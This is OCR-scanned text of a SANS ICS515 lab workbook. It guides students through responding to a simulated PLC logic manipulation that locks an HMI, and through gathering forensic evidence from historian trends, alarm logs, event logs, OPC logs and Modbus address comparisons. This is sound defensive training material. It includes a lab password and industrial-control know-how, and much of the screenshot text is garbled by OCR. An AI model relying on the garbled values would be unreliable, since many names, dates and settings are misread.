N 4 ~ f XN “4 |
|
\ 7» |
|
Generator \ oye |
|
\ ~oY/\o-—
I oo
bai a == oc noo - SSS SS SS SSS SSS SSS SS tbe
=| Load T
Min <> Max T
0 T l T
| ‘on
mom AN Reclosure
109 ' ey e) Open Close
me’ | “os
i AY 7] bead
7 \. Power Meter (%) | na {min <> Max
7 \)———
!
1 \em| =o pi |
VAN [ee T
© 2021 SANS ' Era} ! j———-5
Made in the USA, 1 Pe LL 100)
industry l t Distribution
‘Alam ime ~Acmnowiedsetime ‘Message
7972021 10:50:13 \area Critcal alarm
7ai2021 10:41.23 Pla Transmission Area Ctical Alarm
Tyw2021 355 42 Pe Fuel vahe Citical asm
7172021 3:40:27 PM Ganerabon Area Critical Alarm
71912021 2:49:27 Pl Locai Generator Not At Min For Breaker Closed
7192021 34438 Ph ‘Transmission Area Critical Alarm
7102021 2:10:48 Pd Generation Area Smtical Alarm

> Weare now locked out of the HMI — we cannot change screens and operate our system
> We did not download new HMI code
> Weare not sure if the OEM PLC code had anything to do with our HMI being locked up

© 2021, Robert M. Lee

Lab 3.5-6

@) ey,

ee)

@
wa ww ww

iw

Task — Restore the PLC Code ‘

The traditional response to compromised PLC and / or HMI code is to restore the previous PLC code or restore
to a “Golden” copy. Let’s give that a try and see how that goes ©.

> Load the operational logic file into the PLC

aw

en

iw

a

> Locate the file in the ics515 folder — “ICS515 Site Acceptance Test V1.ckp”
i. This is the known good logic that has been in use prior to the OEM change.
> Double click the file to launch the CLICK programming software with the project

CLICK Programming Software (Version 3.01) - ICS515 Site Acceptance Test V1.ckp - [Main Program]

PAstea re Zz D fates
| © Cross Reference Wyte Project
Connect 13 PLC information

Program Function PLC

| Ry DistindAlarms
MY DistindStetes
$y Distindustrial
fil DistResAiarms
| iigy DistResidentiat
(Rigg DistResStates
Ad Gen Fuel Control

> When the application opens, find in the top menu the icon with the Red Down arrow that is used to
Write a project into a PLC

>  Aconnection screen will appear, you may need to select Ethernet in the Port Type drop down and
you should see a PLC that has been discovered.

‘Connect to CLICK PLC x
‘Switch/Hub a
‘Ths Computer + as
: fe —
ae ees
Ethemet or Ethernet
Direct connection
a S) Location ofthe target CCK PLC

@©n the some LAN (Scan all CLICK PLCs in the LAN automatcally.)

Network Adapter:
) J) Outside this LAN (You need to allocate IP address and port number manuaty.)
Port Settng Chen
BP Address: 192.168.0.8

Subnet Mask; 255,255,258.0
Default Gateway: 0.0.0.0

Refresh Bink RUN AERR LEDs Edt...

© 2021, Robert M. Lee Lab 3.5-7
> Click the Connect button

> Enter the “sansics123” password

replace the entire program without running the code execution engine.

Write Project into PLC
Lg |
|
Project Name: [ICSS15V10 for Production Boards —_| |
| Pragram Size (Total: 6,000 steps) |

| W@iProgram Size: 1,215 steps({ 15.18 %) | |
| | GiiFree Area: 6,785 steps ( 84.82 %) |

0

Project File (Total: 262, 144 bytes)
EiProject File Size 40,590 bytes ( 15.48 %) |
BiFree Area: 221,554 bytes ( 84.52 %) |

|
Deeg ama oe
0 262,144 | |
|

Last Update: Jul 09,2021, 22:54:06

| M write Project File into PLC
| By enabling this option, the project file will be
downloaded{Write) into the PLC. If you want to disable
project upload(Read), disable this option.

5

ICSS15V 10 OEM Change for Productor|

“Program Size (Total: 8,000 steps)

WiProgram Size:
GiFree Area:

jo

1,239 steps (15.48 %)
6,761 steps( 84.52 %)

Project File (Total: 262, 144 bytes)

BProject File Size
GiFree Area:

41,174 bytes (15.70 %)
220,970 bytes ( 84.30 %)

Last Update:

RUN Time Edit
By enabling this option, program will be downloaded into

262,144

Jul 09,2021, 23:12:53

the PLC without switching the PLC mode to the STOP

mode,

> — Confirm that you want to change the PLC to STOP Mode

Project Name: [[CS515V10 for Production Boards |

1,215 steps (15.18 %)
6,785 steps ( 84.82 %)

CLICK Programming Software

PLC is in RUN Mode.

Do you want to change to STOP Mode?

Jul 09,2021, 22:54:06

M1 Write Project File into PLC

By enabling this option, the project file will be
ite) into the PLC. If you want to disable
project upload(Read), disable this option.

© 2021, Robert M. Lee

f PLE
CPU Type: c2-01cPU
Project Name: {ICS515V10 OEM Change for Productior
‘Program Size (Total: 8,000 steps)

| Program Size:
GiFree Area:

Last Update:

144 bytes)

1,239 steps (15.48 %)
6,761 steps (84.52 %)

8,000 |

41,174 bytes (15.70 %) |

220,970 bytes ( 84.30%) |

RUN Time Edit

262,144

By enabling this option, program will be downloaded into
the PLC without switching the PLC mode to the STOP

mode.

a)

Help

Jul 09,2021, 23:12:53 |

When prompted unselect “Run Time Edit” so the PLC program will stop program execution and

Lab 3.5-8

Oo Oh &

, ® fH ow

)

, B®

® Domne ® ® @

?,
Select OK to return the PLC to Run Mode

> Verify the new OEM PLC Code has been downloaded
> Verify the window header says “ICS515 Site Acceptance Test V1.ckp”

~My DistResStates

G4 Gen_Fuel_Control
Si Genlarm:

$i Generation

4 GenStates

(Gf ivinalize

nageyoea peepee:
ph Samia ie bse

~ ig] RemoteCommWt “Transilarms
Aj TransAlarms Transmission
| Hy Transmission | TranStates:
| fy TranStates
interrupt Program
| @ Address Picker | Write Project into PLC...
of Edit Rung Comments ¥ Transfer compieted.
|

| 1C9515 Site Acceptance Test V1 - 0 error(s), O warning(s)

<

Bist integer Bintegert2 words) [Bl Floating pom Me (itet  (AjAcch RUN

> Test if you can change screens

> Go back to the FTView HMI Client and see if you can change screens

© 2021, Robert M. Lee

2-1cPU

1A

Lab 3.5-9
Ty Power Sytem HMl= Main [2 Hour Lint]

Generation

‘Transmission

7 intertie
Swit ' 5
MW Output etal | . Breaker Protection Relay
Open Clo: ' Open Close
“f pe a flee H Open, a Fault, «Reset
1 | ‘
‘ Re
PN f_® | | | » “ NIA ZN
tr
Generator 1 a
= ——
Oo o- onfo-
foc aor re rte nemo SSSt 4 ---- -- - SSS
= Load T
Min <> Max T
30 LJ T T
mal] I | gy red
mood iA _ ‘eclosure
ks hed ! an Open Close
7 1 “oN
> 7 | Load
(Se 1 \ Power Meter (6) | Eye Min Max
Wy 50 >
a WA N 7 } T
© 2021 SANS | ! Goo 4 fia 5 6
Made in the USA. 0 ! Era yON : 100
Indust | Distribution

‘Acknowledge time

‘Alam time

71972021 10.50.13 PH
‘79/2021 10:41:25 PH
77972021 3:55:42 Pd
7/a72021 2:49.27 PA
71972021 349.27 Pu
71a'2021 3:44:38 PA

> We have downloaded the previously running PLC code and we still cannot change the HMI

screens

VVVWV

Message

‘Transmission 4res Critical Alarm

Fuel valve Critical arr

Generation Area Critical Alarm

Local Generator Nott Min For Breaker Closed
Transmission Area Critical lar

The HMI code has not changed or been downloaded
Attempt to power cycle the PLC

Attempt to close the HMI and restart it
Leverage the manual controls to close field breakers, and the sim switches to clear the alarms

as you cannot navigate to the alarm pages through the HMI any longer

> Through these manual controls you can manually start generation, however you no longer have

operator view or control.
> Time to callin an Incident Response team to perform some analysis

© 2021, Robert M. Lee

Lab 3.5-10

(*

@) cP

c®)

m@) my) @) ey @) @®)

)

RP @®@meenenee ®

@)
ww Ww wa ww

ww

© Understand what logging and forensic capabilities can exist on control devices

*Scenario Information* Post incident, during data collection and forensics analysis efforts, there are many
Industrial Control System devices that do not have strong cyber security related logging, or forensics
capabilities. However, there are often effective approaches in leveraging network and endpoint forensics, as
well as process event analysis, historian data, and alarm data to understand the various operations events that
occurred. Leveraging vendor supplied tools for log file analysis, trend analysis, and examining ICS application
specific logs can provide system defenders important insights in regards to normal system behavior and
abnormal events.

Exercise Prep

Close all system breakers, ensure the generator is running, and the system intertie is closed. Close the
operator HMI screen.

1. What is the name of the FactoryTalk Local Log file?

Task — Process Trends and Historical Datasets for Forensics

*Note* Your system is currently locked due to the cyber attack. You cannot complete this task until after Ex
4.2 where you fix the kit. This task remains here because logically it belongs here with the course material
but you will have to revisit this specific task after the next exercise. You can continue on with the next task.

1. Review HMI trends.

> Start the HMI but this time select ‘Yes’ to ‘Delete Log Files Before Running’ in the following
window before selecting ‘Run Application’.

Delete Log Files | © Y

Before Running

s
C No

> Ensure all breakers are closed, generation is running and intertie is closed.

© 2021, Robert M. Lee Lab 4.1-1
> From within the HMI, open the ‘Trends’ menu and cycle through each trend in the menu. Take

note of whether some of the traces are displaying historical and current values while others are
not similar to the image below.

Trends

Generation
eee eee
Transmission &
Distribution

=<)

‘

|

*Note* Sometimes anomalies exist in actual environments that must be understood when using these
applications for forensics purposes. In this system using well known ICS vendor software, there is a race
condition between the start of the datalog server and the response from the initial request from the OPC
server. The result is that some of the values are continuously recording while others never get recorded. Bugs
like these can become more relevant with an increased mix of vendors, application versions and system
response (i.e. PLC programming and network operation). The image below demonstrates this anomaly. The
values for ‘CT Running’ are not recording even though they are configured to record. This is identifiable
because of the gap in data before the opening of the display.

2.

*Note* The trend values are polled and stored at set periodic time by the developer of the display. Every time

a Bl Generator Breaker

oe Bi Transmission Breaker
<a} [MM Protection Relay

CT Running

|
| BB avron

Understand how historian is used.

From within the HMI, open the ‘Trends’ menu and select ‘Transmission & Distribution’.

Many data points are being recorded. For testing purposes, open all breakers across the
environment.

Return to the ‘Transmission & Distribution’ display and notice the change in values of the data
points.

a trend display is opened, the associated data points and values are called from the stored location. How
those values are stored varies by the application being used.

a

heal

fe

>

>

3. Understand how trend datasets are stored.
> From the Windows VM Open Explorer and navigate to the following folder.
© 2021, Robert M. Lee Lab 4.1-2
ey PF wD Ww WD WP PW eS we we ww

we we Ww

‘C:\Logs\DataLog’

Open the file DataLog.log in Notepad.

Clearly the file is not stored in plain text. This file can be viewed by using the tool provided
from the vendor, open the application ‘FactoryTalk View File Viewer’.

Navigate to ‘C:\Logs\DataLog’ and change the file type to ‘ME Datalog (*.LOG)’

File name:

SE Datalog Files (*.DAT;*.0BF) ~

>

SE Datalog Files (*.DAT;*.OBF)

ME Datalog File (*.LOG)
ME Alarm Log File(*.ALM)

dBASE File(*.DBF)
RecipePlus File(*.RPP)
RecipePro File(*.RCPF)

Open the DataLog.log file, choosing any timezone and review the information.

*Note* All of the records are present and indicate what they are associated with. The configured tag of the
data to be recorded is shown. A mapping of the tag names against the names used in the trend displays (i.e.
CT Running) would be useful but can easily be found by the controls engineer. This dataset records the past
state of the process which can be used as evidence of process conditions outside of expected operations.

Task — Process Alarm Logs for forensics

1. Identify HMI alarm logs.

>
>

VVVV WV

Ensure the HMI is running and open some breakers to trigger alarms.
Open Explorer and navigate to the following folder.

C:\Users\Public\Documents\RSView Enterprise\ME\Logs\ICS515V5\M_Alarms

You should see a few alarm files here, Embedded, history, reset, and status alarm logs
Open the application ‘FactoryTalk View File Viewer’.

Navigate to the file path indicated above and hit ‘Enter’.

Change the file type to ‘ME Alarm File (*.ALM )’

Select ‘history.alm’ history

© 2021, Robert M. Lee Lab 4.1-3
5D open x
- vf © ME > Logs > ICS515V4 > M_Alarms v © Search M_Alarms Pp
Organize > —_ New folder ae- © @

Student Files Name Date modified Type Size
B Videos ©) embedded.alm ALM File 1KB
@ OneDrive _) history.alm ALM File 1KB
“] resetaim ALM Fite 1KB
© Thi >
ini ) statusiaim 2021 3:19 EM KB
8 3D Odjects
@® Desktop
4) Documents
& Downloads
} Music
© Pictures
B Videos
J locaiDiskicn Y < 2

v| (ME Alarm Log File(*.ALM) ™

File name: |history.alm

> Leave the bullet ‘Win32/CE (9.0 or later)’ selected and click the path select button ‘.... to choose

the alarm setup file.

> Since the development copy of the project file is not stored, the runtime version will need to be
used. Type only %TEMP% in the path field and select enter.

> Open the ‘““MER.OO’ folder.

Open x
@

e Search M_Alarms P

Organize * New folder =+ © @

2 Music “Name Date modified Type Size

Student Files 0) MachineAlarms.mal 7/36/2021 3:09 PM MAL File SKB

@® OneDrive

@ This PC

J 3D Objects
(@ Desktop
=} Documents
& Downioads
2 Music

& Pictures
gz Videos

= _lacalNiskica Y ¢

ME alarm setup files (*.mal) v

File name: IM

*Note* This folder is only present when the HMI application is loaded.

> Within the ~MER.00 folder, scroll down and open the M_Alarm folder.
> Choose ‘MachineAlarms.mal’ and click ‘Open’.

© 2021, Robert M. Lee Lab 4.1-4

e® f® @® @&

Ce

)

fe)

(®)
VY ip’ a) ip) <p ip

j

> Click ‘OK’.

Select FactoryTalk View ME Alarm Setup File

FactoryTalk View ME alarm log file:
CAUsers\Public\Documents\RS View Enterprise\ME\Logs\ICS515V4\M_Alarms\histary.alm

ME alarm log file (alm) is generated from
© CE Terminal(Mozar/Raptor)  Win32 (3209 © Win32 (4x ar 6.1)

© CE Terminal(PVPCE6) © Win32 (6.0 - 8.20) (@ Win32/CE (9.0 or later)

FactoryTalk View ME alarm setup file:

C:\Users\sansics\AppData\Local\Temp\~*MER.00\M_Alarms\MachineAlarms.mal bd

OK

© 2021, Robert M. Lee

Lab 4.1-5
*Note* The alarms are listed with the timestamps of when the alarm occurred (TimeOn) and when the alarm
was acknowledged (TimeAck). Unfortunately knowing what each alarm is, is not present in this table but is
referenced as ‘Trigldx’. Some other piece of information is needed and luckily the engineer was kind enough to
supply the following configuration table from the development software.

Trigger Trigger Value Message
1 {::Clickplc.0:16395} 1 Generation Area Critical Alarm
2 {::Clickplc.0:16492} 1 Transmission Area Critical Alarm
3 {::Clickplc.0:16501} 1 Transmission Breaker Tripped
4 {::Clickplc.0:16398} 1 Local Generator Not At Min For Breaker
Closed

::Clickplc.0:16405}
::Clickplc.0:16592}
::Clickplc.0:16692}
:Clickplc.0:16428}

Generation Breaker Tripped
Residential Area Critical Alarm
Industrial Area Critical Alarm
Fuel Valve Critical Alarm

onauw
ao
PRPRPP

> Using the alarm messages shown in the HMI and File Viewer, identify the mappings between
the TriglDx column in File Viewer and the Message column in the engineer supplied table.

Task — ICS Application Logs for Forensics

1. Identify HMI application logs.
> Start the HMI but run through the following window BEFORE selecting ‘Run Application’.
> Click ‘ Terminal Settings’

FacteryTalk View ME Station [2 Hour Limit] - 10.00,00.290(Patch 03)

Current application:

1CS515V1.mer

Load Application Run Application Application Settings
IF3]

Delete Lag Files
Before Running
IFS)

Terminal Settings
IF]

© 2021, Robert M. Lee Lab 4.1-6

a aN

9?@meenmemnenenmnenh»mnnnnn *® ® ©

uv

”? ?, ?
Se FTF WY WT WT WY Ww WD ee we ww

ry

TY

> Open ‘Diagnostics Setup’ from the terminal settings menu.

> Click ‘Yes’ to allow app to make changes.

> Drill down to ‘Diagnostics Setup’ -> ‘Destination Setup’ -> ‘Local Log’

oH Diagnostics Setup

Diagnostics Setup Local Log Destination Setup
- Destination Setup

FT View Diagnostics List
FT View ME Audit Trail
Mt ccal Log

ODBC Database eee RES AE nes Lat
i» Message Routing pS Sy Se ee

Maximum log size: [25600 = KB

When maximum log size is reached:
@ Overmrite events as needed
( Archive the log when full

© Do nat overwrite events
(clear log manually}

Clear Log |

~ Logging path

Vinevt,Logs\FT Diag.evts

Cancel Apply Help

*Note* Vendors of HMI software may store logs differently, however, this HMI uses Windows Events as the
location for these logs. Additionally, when identifying the log locations take note of the ‘Maximum Log Size

and other settings that may be useful for forensics planning.

> Cancel out of the ‘Diagnostics Setup’ window.
> Close out of ‘Terminal Settings’.
> Run the application.

2. Exploring the HMI logs.
> Open Windows Event Viewer.

Best match

H ‘| Event Viewer
Desktop app

Command

@ eventvwr

All Apps Documents Settings Web

Saaabliied

More VW

Vv

> Navigate to ‘Applications and Services Logs’ -> ‘FactoryTalk Diagnostics’
> Walk through the logs taking notice of the various service starting and stopping.

3. Identify OPC server logs.

© 2021, Robert M. Lee

Lab 4.1-7
> Open the MatrikonOPC Analyzer.

License Wizard

MatrikonOPC Analyzer

eee

MatrikonOPC Analyzer User Manual

MatrikonOPC Explorer

> Ensure all boxes have been checked and select Desktop as the ‘Output Path’.

> Click Run.

® MatrikonOPC Analyzer

{¥ System Information |¥ Log Files | mg

|¥ Configuration Files [¥ pcom Exit

\ Zip Output Files

[¥ Change Directory Output Path _...
C: \Users\sansics\Desktop| I

@ MatrikonOPC

> Once the operation completed, ‘Exit’ the utility and open the Desktop.

> Anew folder and compressed zip file sharing the same name starting with year-month-day

should be present on the Desktop.
> Open the folder.

*Note* Unlike the HMI vendor, this OPC vendor choose to provide a collection tool (likely for troubleshooting
purposes) that pulls some useful information about not only the software but also the host configuration.

> Open each of the ‘TXT’ files and take note of their contents. Some contain paths to more useful

configuration files and logs.

> Open and review the ‘DCOMInfo.txt’ file. As an OPC DA server, the installation process of this
software has configured DCOM on this host to ALLOW EVERYONE to access these services.

(eB) @) qe) @) qe) () ce) @) ee) (@) (ey) cB) (B)

)

(B) @) @) @) .

‘B)

> Open the ‘ConfigFileInfo.txt’

> Look inside the zip file and open the file ‘Modbus_DefaultConfig.xml’ in a browser. This is the
actual running configuration of the OPC server. You can also view
‘Modbus_ModbusImportConfigurationSchema.xml’ to understand the OPC configuration

> Open the ‘LogFileInfo.txt’. The paths listed are of the paths to the actual application logs.

> Open the ‘Common_PSTCFGMatrikon.OPC.Simulation.1’ file in notepad.

> Take note of the data/time of the last entry, close the file and shutdown the HMI application.

> Re-open the file and take note of the new entries.

© 2021, Robert M. Lee Lab 4.1-8

@ @

‘B)

‘we
“Bp

as

a3

*Note* This log captures the computer name from where the connection was connected and disconnected
from. Since the number of client computers is typically small and known, this could be a very useful identifier
of where a rogue connection originated from.

Exercise Takeaways

In order to take advantage of the system historical data, and process data application event logs that are
available to system defenders, there is a need to first understand what those data sets traditionally look like.

© 2021, Robert M. Lee Lab 4.1-9
wo ®© wo O8 WwW |W ww weeweeewew

oo oO YD wD YD W

AY

_Lab 4.2 -Logic Analysis and Reset

Objectives
e Identify what was wrong in the logic and reset the system to a good state
e Determine when the logic manipulation first resulted in manipulation in the HMI

*Scenario Information* The C3PO HMI was locked out unexpectedly after the OEM’s logic change to the Click
PLC. At first pass this does not make sense because that would imply a PLC change is impacting the HMI
negatively but is the most realistic scenario given the recent changes. Therefore, we need to analyze the logic
and the available network data to determine root cause analysis.

This is a continuation of exercise 3.5 and will utilize the Windows VM and PLC Kit. The last part of the lab will
utilize Lockedhmi . pcap in the RELICS VM.

[Questions :

1. What is the Register value of the changed logic?

2. What is the value of the Register?

3. What is the HEX value to search the pcap for Responses with Register 50?

4. What is the first packet the write occurs at in this session and at what time?

© 2021, Robert M. Lee Lab 4.2-1
Task ~ Determine where in the PLC Code the HMI is being commanded :

1. What is the Register value of the changed logic DS51

*Note* We need to find out why the HMI is becoming locked; the logical explanation is something in the HMI
but the only thing that recently changed is the OEM’s new PLC code and therefore we will start there.

*Note* The Click software does not support a program comparison function (some vendors have this) but it
does support an export of Modbus addresses that are being used. We can compare the two exports and see if

we can spot a difference.

> Using Notepad++ with the comparison Plugin installed, compare the original PLC file with the new

@

«

OEM supplied code.
> Open Notepad++

[Of new 1 - Notepad++

File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window ? x
SSH sea «eH acl|aylae& 2 VEDBA aS SPH RBSERer«+ eB
oi

Een? |

Ln:1 Col:1 Pos:1 Windows (CRLF) UTF-8 INS

Normal text file length 0 tines: 1

Open both ICS515 OEM Change V2_Modbus_Addresses.csv file and ICS515 Site Acceptance Test

V1_Modbus_Addresses.csv
> Open the ics515 folder on the Windows VM Desktop
> Once both files are open, you will see both files appear in two separate tabs

© 2021, Robert M. Lee Lab 4.2-2

ed ~~ Chel oo, ra (; .; @ ff ? (; Co

A
File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window ?
New
Open...
Open Containing Folder
Open in Default Viewer
Open Folder as Workspace...

wT wT WY &

Cut+R
Ctri+S
Ctrl+Alt+S

w

Ctrl+ Shift+S

Ctrl+W
Ctrl+Shift+W

{Af CAUsers\ics612" Dropbox\SANS ICS\Courseware\ICS515\Click\ICS515V10 OEM Change for Production Boards Modbus_Addresses.csv - Notepad++

File Edit Search View Encoding Language Settings ry Macro Run Plugins Window ?
1G SS Gal 4 RID Cia ie 2 BEDI EaABA Pe RB ORB x + ~ = G

GF f71CS515V10 OEM Change tor Producton Boards Modbus Addresses cav £3

ddress,Data Type, Nodbus ‘Address, Function Code, Nickname, Initial Value, Retentive, Address Comment
XO01,BIT, 100001, "8C=02","Gen_ Breaker Open_PA",0,No, “Generation Switchyard Breaker Open PB!
X002,BIT, 100002, "FC=02", "Gen Breaker Close PB", “Generation Switchyard Breaker Close PB"
X003,BIT, 100003, "Fc=02", "Trans Breaker_Open_PB",0,No, "Transmission Breaker Open PB”
X004, BIT, 100004, "FC=02", "Trans Breaker Close PB",0,No, "Transmission Breaker Close PB"
%101, BIT, 100033, *FC=02", "Trans _Prot_Rly_Fault_fB",0,No, “Transmission Protection Relay Fault PB"
X102, BIT, 100034, *FC=02", “Trans Prot_Rly Clear P8*,0,No, “transmission Protection Relay Clear Fauit FB"
X163, BIT, 100035, *FC=02", “Dist_Res_CktReCls_opn_PB",0,No, “Distribution Circuit Reclosure Open FB"
X104, BIT, 100036, *FC=02", "Dist Res CktReCls Cls PB", 0,No, "Distribution Circuit Reclosure Close PB"
X202, BIT, 100066, "FC=02", "SIM2*, 0,No, "Seasonal O=Winter Rating ; 1=Summer rating"
X203, BIT, 100067, "FC=02", "SIM3",0,No,"Intertie: O=No External Generation Resources ; l=External Generation Resources Availab:
X204, BIT, 100068, "FC=02", "SIM4", 0,No, "Reset Generation Alarms”
X205,BIT, 100069, *FC=02", "SIMS", 0,No, "Reset Transmission Alarms*
%206,BIT, 100070, *Fcm02", "SIME", 0,No, "Reset Distribution Residential Alarms"
X207, BIT, 100071, "FC=02", "SIM7",0,No,"Reset Distribution Industrial Alarms*
X208, BIT, 100072, "FC=02", "SIME", 0,No, "Expert Mode= Local Gen must be >= to min value value for breaker close && Industrial HMI Breaker is
YOOL, BIT, #193, "FO=0i, 05, 15", "Protect Rly Reset_Light",0,No, "Protection Relay Fault Light”
¥002, BIT, £194, "FC=01,05, 15*,"Trns_Brkr_Closed_Light",0,No, “Transmission Breaker Open Light”
1003, BIT, 8195, "FC=01, 05,15", "Gen Brkr_Closed_Light",0,No, "Generation Breaker Open Light"
Y004, BIT, 5196, *FC=01,05, 15", “Intertie Closed Light",0,No, "Interconnect Status Light : een, Local Power Only ; 1 = Red, External Pow
Y101, BIT, 8225, "FC#01, 05, 15", "Dist_Res_Load0To100",0,No, "Distribution Residential Load Output Light61 (9-1008)"
¥102, BIT, 8226, "£C=01, 05,15", “Dist _Res_Load33To100",6,No, “DistributicnResidential Load Output Light02 (33-1008)"
¥103, BIT, 8227, "FC=01,05, 15", "Dist_Res_Load6éTo100",0,No, "Distribution Residential Load Output Lightd3 (66-1001)"
¥104, BIT, 9228, "FC=01,05,15","Dist_Ind_ Power Avail",0,No, “Factory Power Available (Yellow)*
¥105, BIT, 8229, "FC=01, 0S, 15", "Dist_Res_Reclsr. ed", 0,No, "Distribution Residential Reclosure Closed (Not Physical)”
Ci, BIT, 16385, "FC#01, 05,15", *"Gen_State Idle*,0,No, "Generation State Idle"
C2, BIT, 1636, "FC=01, 05,15", "Gen State Generate", 0,No, “Generation State Generate”
©3, BIT, 16387, "FC=01, 05,15", "Gen_State Alarm", 0,No, "Generation State Alarm”
CE, BIT, 16390, "FC=01,05,15", "Gen Start _Gen_PB_HMI*,0,No, "Generation Start Generator PB HMI"
CT, BIT, 16391, "FC=01, 05,15", "Gen_Stop_Gen_PB_HMI",0,No, "Generation Stop Generator 2B HM"
C8, BIT, 16392, "FC=01, 05,15", "Gen Generator Permissive", 0,No, "Generation Area Initiate Generator"

WY we we ww

wy

‘yp

[Normal text file length : 18.342 lines: 182 ta:1 Col:1 Post Windows (CRLF) _UTE-8 INS

> Using the Plugin menu, select the Compare pulldown menu and click Compare
> Identify the changes

wp “ep 4B’

4p’

© 2021, Robert M. Lee Lab 4.2-3

a
[Dy Causers\tes612)\Dropbox\SANS ICS\Courseware\IC$515\Click\ICS515V10 for Production Boards Modbus_Addresses.csv - Notepad++ [Administrator]
File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window?

s8H& s

2Q\ 4h) Scia%e/ 22 Ba

325, BIT, 16705, "!

01,05, 15",
27, BIT, 16711, "FO=01, 05,15"
0328, BIT, 16712, *FCH01, 05, 15". "1

C329, BIT, 16713, °F
€330/BIT, 1€714, *FC=01, 05, 15*, spist

€335, BIT, 16719,

‘13, BIT, 145059, “FC
T10, BIT, 145066, "FC#02", "Gen_Fuel_|

T15,BIT, 145071,"

DS1, INT, 400001, *FC=03,

ps4, INT, 490004
DSS, INT, 40
DS€,INT, 400006, "FCH03,06,16",*

FC#03,06,

712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp_Watchdog"
ce02", "Coma Watch Dog Timer", 0,No, “Communications Watch
be2,Brr, 161442, *Fo=02","_1st_SCAN", 0,No, ""

16", "Gen External MW Max",
DS2, INT, 400002, "FC=03, 06,16", "Gen_Generator_Max_Pw1
DS3, INT, 400003, "FC=03, 06,16", "Gen _Bar Graph Out Cal

{=IICS515V10 for Production Boards_Modbus Addresses csv £9 VpaeSetsviniein crs

S*, *Eurnace2
326, BIT, 16710, "FC=01, 05,15", “Furnace2_Off HMI", (
'"Digt_Ind_BrkE_opn_t

6331, BIT, 16715, “FC=01, 05, 15", "Dist_Ind Brkr_Close Pex", 0,No, *Distributi
C332, BIT, 16716, *FC=01, 05, 15", "Dist_ind_Brkr_Closed",0,No, "Distribution Ii
€334, BIT, 16718, "FC=01, 05,15", "Dist_Ind_Open_Brkr_HMI",0,No, "Distribution |)
."ECH01, 0S, 15", “Dist_Ind_ Close Brkr_HMI",0,No, "Distributio
12, BIT, 14506, "FC=02", “Gen_Ramp_Up To, Lo
2", "Gen Ramp Down To_L

oad", 0,No,

neration
Generation Ramp Gene
jalve Ramp, Sim", 0,No, "Generation Local
No, "Generation Fuel Ra

0, Yes, "Generation Max
0, Yes, "Generation L.
0,Yes,"Generation Bar Graph Calculated Output Value"

", "Gen Generator Out Value", 0,Yes, "Generation Generator Output Value"

“FC=03, 06,16", “Gen_Genertr_} 0

n_Total_Requested.! Pwr, 0,Yes, "Generation Total Requested Power®

Set as First to Compare

Clear Active Compare

CirheAlteShittex

Clear Ail Compares
Diff since last Save
SVN Dit

Git Ditt

ignore Spaces
Detect Moves
Navigation Bar
Previous AitePage up
Next Arts Pa

First rere

Ctrl+AiteD
Crrieaitey
CtrteAlteS

Ramp Genera

Last CitieAltePage down

Settings
About_

s, "Generation Generator Minimum Breaker Close Setpoint Ma"

DS?, INT, 400007, "FC=03, 06, 16", “Gen_Total Available Pwr*,0, Yes, "Generation Total Available Power"
DS8, INT, 400008, *FC=03,06, 16", "Gen Total Loc] _MM_S®", 0, Ye

Ds$, INT, 400009, "

C=03, 06,16", "Gen Total Bxt_Nw_SP*,

Generation Local MW Output Setpoint*

Generation External Mw Output Setpoint*

DS10, INT, 490010, "FC=03, 06,16", "Gen_Local_Manual_Out_sP",0,¥es, "Generation Local Manaul Output when AVR is Off"
DS11, INT, 400011, "FC=03, 06,16", “Gen_CT_Fuel_Valve Man_SP",0,¥es,"Generation Combustion Turbine Fuel Valve Manual Setpoint*

DS12, INT, 400012, “FC=02, 06, 16", "Gen_CT Fuel _Valve_out®, 0, ¥
DS13, INT, 400013, "FC#03, 06,16", "Gen_CT Fuel Viv _Auto_Rem*
DS14, INT, 400014, "FC=02, 06,16", "Gen Puel_Valve_3P CV Err", 0, Yes, "Generation Combustion Turbine
INT, 400015, "EC#03, 06,16", "Gen CT Fuel viv Min Font", 0, Yes, "Generation Combustion Turbine

DS15,

0,¥es,"Generation Combustion Turbine

;*Generation Combustion Turbine Fuel Valve Output "

Fuel Valve Output Automatic Mode Remote"
Fuel Valve Position Error {Setpoint - Actue
Fuel Valve Minimum Output Percentage” “

angi: 1240 lines : 180

Ln: 133 Coli 1 Pos: 13,348

Windows (CR LF

UTF-8

*Note* This will bring up a side-by-side comparison of both CSV files. Scrolling down through the differences,

you will see a RemoteHMIDelay timer and a memory register DS51 RemoteHMI tag.

LY causers\tes812"\Dropbox\ SANS ICS\Courseware\ICS515\Click\ICS515¥10 fr Production Boards_Modbus_Addresses.csv - Notepad++

File Gait Search View Encoding Language Settings Tools Macro Run Plugins Window  ?
«a

sG8He euSlid whi 2c aa

{R}1CS515V 10 for Production Boards_Modbus_ Addresses cov EF

ata

2 4)

jm gi\DReGs.v ee

+ [G)e8518110 08M Change fr Producton Boards Modbus Adcrossen cov El |

(C325, BIT, 16709, "FC=01, 05, 18", "Furnace?
£926, BIT, 16710, "Fc=01, 05, 15", "Furnace?
C327, BIT, 16711, "PC=01,05,

329, BIT, 16713, "FC=01, 05, 15", "Di
330, BIT, 16714, *FC=01,05, 15", "Dis
€331,81T,
SaarTait evie, sOLL0S, ist,
€334,BIT, 16718, "FC#01,05, 15'
6335, BIT, 16719
T2, BIT, 145058,"

Ind
Ind

715, BIT, 145071, "FC=02", "Comm | Watch Dog”
x4}

DS3, INT, 400003, "FC=03,
elias tonspicatrsepng 16", "Gen_Gene:

1 INT, 400005, “FC=03, 06, 16", "Gen_Gene:
DS, INT, 400006, "FCH03, 06, 16", "Gen-Tota

DS7, INT, 400007, "EC#03, 06, 16", "Gen Total Available pw
DSB, INT, 490008, "FC=03, 06,16", "Gen_Total_Loc]_MW_SP™,
16", "Gen Total _Ext_Mw Se", 0
*Geh_Local_manual_out_
3,06,16", "Gen CT_Fuel valve Man | | 146
400012, "FO=03,06, 16%, "Gen_CT Fuel Valve out |i} 147
Cx03, 06,16", "Gen CT Fuel viv auto [|i4e
Fo=03, 06, 16", "Gen Fuel Valve Sp cv || 145

DSY, INT, 400009, "EC=03, 0
S10, INT, 400010, "FO=03,
j& | DS11, INT, 400011, "FC!
7 0812,
8 (S13, INT, 400023,
DS14, INT, 400024

16

15", "Dist ind 4
¢328,81T, 16712, "FC=01,05, 18", "Dist Ind!

ne
“EC=01, 05, 15", "Dist_Ind_<¢
02", "Gen Ramp Up_To Load", 0,No,*Ge | |128
